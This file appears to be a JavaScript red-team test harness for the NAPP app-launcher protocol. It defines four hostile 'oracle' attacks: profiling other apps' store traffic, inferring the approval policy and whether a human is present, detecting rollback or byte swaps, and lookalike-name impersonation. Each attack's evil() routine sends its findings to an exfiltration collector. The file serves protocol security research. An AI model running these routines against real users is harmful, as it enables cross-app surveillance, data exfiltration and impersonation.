// evil-08 — hardened-launcher oracles (tier 3). Everything here arms against
// a PERFECT launcher: these are findings against the NAPP protocol itself,
// not against any implementation.
//
//   - The shared store is a broadcast channel: nostrdb.subscribe observes
//     every event any app inserts, whatever saved it (validated from the
//     reference source: notifyStoreSubs fans every saved event to every
//     matching subscription — cross-app traffic analysis by design).
//   - Approval outcomes are observable: which of another app's gated calls
//     make it into the store reveals the prompt policy — and whether a human
//     is clicking allow.
//   - A napp is bytes fetched by manifest, every load, with no content
//     addressing anywhere in NAPP.md: manifest selection is newest-wins from
//     untrusted relays (validated: the reference's fetchManifest picks the
//     highest created_at), file hashes exist only as launcher policy, and
//     rollback/swap is undetectable in-frame.
//   - metadata.json titles and ids are claims, not identities: nothing binds
//     a name to a key, so lookalike cards are indistinguishable.
window.__EVIL_KIT__ = [
  {
    label: 'the rollback manifest',
    note: 'NAPP.md has no pinning, no content addressing, no version freeze: relays decide which manifest exists (the reference takes the newest created_at it is SHOWN — a relay withholding the newest serves an older, signed, perfectly valid one). File hashes in path tags are launcher practice, not protocol.',
    data: { kind: 35130, tags: [['d', 'victim-app-id'], ['title', 'Victim Notes'], ['created_at', '(older — the version with the bug you patched)']], note: 'signed by the real author, served by a hostile relay, run by the launcher' },
  },
  {
    label: 'the lookalike pair',
    note: 'Nothing binds a title or an id to an author. Two cards titled "Relays" — one by the victim, one by me — differ by nothing the protocol can check. The user picks blind; so does any picker.',
    data: [
      { id: 'relays', title: 'Relays', author: 'the victim' },
      { id: 'reIays', title: 'Relays', author: 'me (note the capital I)' },
    ],
  },
];

const SUB_CB = 'evil08sub';
// the victim's result echoes (harness instrumentation) — the oracle's other
// sensor: attempts that never land in the store are only visible here
const echoFeed = [];
window.addEventListener('message', (e) => {
  const d = e.data && e.data.__victimEcho;
  if (d && /publish/.test(String(d.what))) echoFeed.push(d);
});
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
async function sha256Hex(text) {
  const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(text));
  return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, '0')).join('');
}
async function rpcOk(method, params) {
  const r = await bridgeRpc(method, params);
  if (r === 'timeout') return { error: 'rpc timeout' };
  if (r && typeof r === 'object' && r.error !== undefined) return { error: r.error };
  return { result: r && r.result !== undefined ? r.result : r };
}
async function queryK1() {
  const r = await rpcOk('nostrdb.query', { filters: { kinds: [1] } });
  return Array.isArray(r.result) ? r.result : [];
}
// live store traffic: raw subscription rpc + the sub-event message channel
function startStoreTraffic(onEvent) {
  window.addEventListener('message', (e) => {
    const d = e.data;
    if (d && d.__nostrapps === 'nostrdb-sub-event' && d.callbackId === SUB_CB && d.event) onEvent(d.event);
  });
  return rpcOk('nostrdb.subscribe', { filters: { kinds: [1] }, callbackId: SUB_CB });
}

const ATTACKS = [
  {
    id: 'store-traffic',
    name: 'cross-app traffic analysis',
    target: 'nostrdb.subscribe — the shared store is a broadcast channel',
    severity: 'critical',
    harm: 'The launcher-wide store shows every app\'s inserts to every other app: what a user publishes, syncs, saves — the composition of their session is a side channel no launcher can close without splitting the store the protocol hands out.',
    evilBrief: 'Holds a store subscription open, profiles every insert (kinds, counts, masked samples), and POSTs the traffic profile to the collector.',
    async demo() {
      const seen = [];
      const ok = await startStoreTraffic((ev) => seen.push(ev));
      if (ok.error) return blocked('store subscription refused: ' + ok.error);
      await sleep(7000);
      await rpcOk('nostrdb.unsubscribe', { callbackId: SUB_CB });
      const others = seen.filter(e => (e.content || '').indexOf('victim activity ping') !== -1);
      if (seen.length === 0) return na('no inserts during the probe window — open the victim napp to feed this channel');
      return armed('observed ' + seen.length + ' live insert(s) into the SHARED store (' + others.length + ' by other apps — ' + (others[0] ? 'e.g. ' + mask(others[0].content, 20) : 'masked') + '). Whatever any app saves, I see: cross-app traffic analysis is a protocol property, not a bug');
    },
    async evil() {
      const seen = [];
      await startStoreTraffic((ev) => seen.push(ev));
      await sleep(8000);
      await rpcOk('nostrdb.unsubscribe', { callbackId: SUB_CB });
      const profile = {
        total: seen.length,
        kinds: {},
        sample: seen.slice(0, 5).map(e => ({ kind: e.kind, content: (e.content || '').slice(0, 40) })),
      };
      for (const e of seen) profile.kinds[e.kind] = (profile.kinds[e.kind] || 0) + 1;
      const out = { profile };
      out.exfil = await sendToCollector('store-traffic-profile', profile);
      return out;
    },
  },
  {
    id: 'policy-oracle',
    name: 'approval/presence oracle',
    target: 'which of another app\'s gated calls land in the store',
    severity: 'high',
    harm: 'Approval outcomes are observable from outside the dialog: if another app\'s gated publishes appear in the store, the launcher auto-allows (or a human keeps clicking allow); if they never appear, prompts hold. Either way the napp learns the policy — and a human clicking allow is a presence signal.',
    evilBrief: 'Watches the store for another app\'s gated publish attempts and POSTs the inferred policy to the collector.',
    async demo() {
      const before = (await queryK1()).filter(e => (e.content || '').indexOf('victim gated publish attempt') !== -1).length;
      const echoBefore = echoFeed.length;
      await sleep(9000);
      const after = (await queryK1()).filter(e => (e.content || '').indexOf('victim gated publish attempt') !== -1).length;
      const attemptsSeen = echoFeed.length > echoBefore;
      if (after > before) {
        return armed('the victim\'s gated publishes ARE landing in the store (' + before + '→' + after + ') — this launcher auto-allows (or someone keeps clicking allow: a presence signal). The approval state is a public oracle');
      }
      if (attemptsSeen) {
        return armed('the victim\'s gated publish attempts are being made (its result echoes reach me) but NONE land in the store — prompts are holding them all. The absence is the answer: the approval state is a public oracle no dialog design closes');
      }
      if (before === 0 && after === 0) {
        return na('no gated publish attempts observed (neither in the store nor in its echoes) — open the victim napp with the noisy knob on to feed this oracle');
      }
      return armed('gated publish attempts exist but the store shows no new landings — the approval state is a public oracle');
    },
    async evil() {
      const before = (await queryK1()).filter(e => (e.content || '').indexOf('victim gated publish attempt') !== -1).length;
      await sleep(9000);
      const after = (await queryK1()).filter(e => (e.content || '').indexOf('victim gated publish attempt') !== -1).length;
      const inference = after > before ? 'auto-allow (or an approving human)' : 'prompts held every attempt';
      const out = { before, after, inference };
      out.exfil = await sendToCollector('policy-oracle', out);
      return out;
    },
  },
  {
    id: 'byte-swap',
    name: 'unverified bytes (TOCTOU)',
    target: 'every load is unverified bytes — no content addressing anywhere in NAPP.md',
    severity: 'critical',
    harm: 'A napp is its manifest\'s bytes fetched at load time; the protocol binds nothing. Any component between the manifest and the frame — a relay withholding the newest version (rollback), a swapped cache, an updated server — changes what runs, and neither the user nor the running code can tell. Pinning is launcher policy, not protocol.',
    evilBrief: 'Re-hashes this origin\'s served metadata.json against the first-run hash and POSTs any divergence to the collector (the launcher\'s debug swap control demonstrates the swap in-test; production does it via relays).',
    async demo() {
      let text = null;
      try {
        text = await fetch('/metadata.json').then(r => r.text());
      } catch (e) {
        return na('cannot fetch my own metadata.json here (' + errMsg(e).slice(0, 50) + ')');
      }
      const hash = await sha256Hex(text);
      const KEY = '__evil08_meta_hash__';
      const prior = (() => { try { return localStorage.getItem(KEY); } catch (_) { return null; } })();
      if (!prior) {
        try { localStorage.setItem(KEY, hash); } catch (_) {}
        return na('first run: my served-bytes hash is recorded (' + hash.slice(0, 10) + '…). Nothing verifies it will match tomorrow — use the launcher\'s debug swap control (or, in production, any relay between the manifest and my load) to change my bytes underneath me');
      }
      if (prior !== hash) {
        return armed('MY BYTES CHANGED UNDERNEATH ME: ' + prior.slice(0, 10) + '… → ' + hash.slice(0, 10) + '… — no protocol mechanism noticed, nothing binds my running code to the manifest that described me, and the user cannot tell either');
      }
      return armed('bytes match my first-run hash — but NOTHING VERIFIES that they will next load: NAPP.md binds no content address to any fetch (manifest selection is newest-wins from untrusted relays; the rollback manifest in the kit is signed, valid, and older)');
    },
    async evil() {
      let text = null;
      try { text = await fetch('/metadata.json').then(r => r.text()); } catch (e) { return { error: errMsg(e) }; }
      const hash = await sha256Hex(text);
      const KEY = '__evil08_meta_hash__';
      const prior = (() => { try { return localStorage.getItem(KEY); } catch (_) { return null; } })();
      try { localStorage.setItem(KEY, hash); } catch (_) {}
      const out = { prior: prior ? prior.slice(0, 12) : null, current: hash.slice(0, 12), swapped: prior ? prior !== hash : false };
      out.exfil = await sendToCollector('byte-swap-watch', out);
      return out;
    },
  },
  {
    id: 'name-squat-card',
    name: 'metadata impersonation',
    target: 'metadata.json titles and ids are claims, not identities',
    severity: 'info',
    harm: 'Nothing binds a name to a key: a lookalike id (reIays vs relays) and a copied title produce a card indistinguishable from the victim\'s — in the app list, in the ambiguous-handler picker, in share links. Only out-of-band verification can tell them apart.',
    evilBrief: 'Nothing to execute — this row is the lookalike pair in the kit (see the attack kit above); the exfil sends it as a reminder.',
    async demo() {
      return na('nothing to detect in-frame — the launcher renders whatever title/id my metadata claims (mine are honest). The lookalike pair in the kit shows what an dishonest one costs; only out-of-band key verification binds a name to an author');
    },
    async evil() {
      return { exfil: await sendToCollector('lookalike-pair', { pair: [{ id: 'relays', title: 'Relays' }, { id: 'reIays', title: 'Relays' }] }) };
    },
  },
];
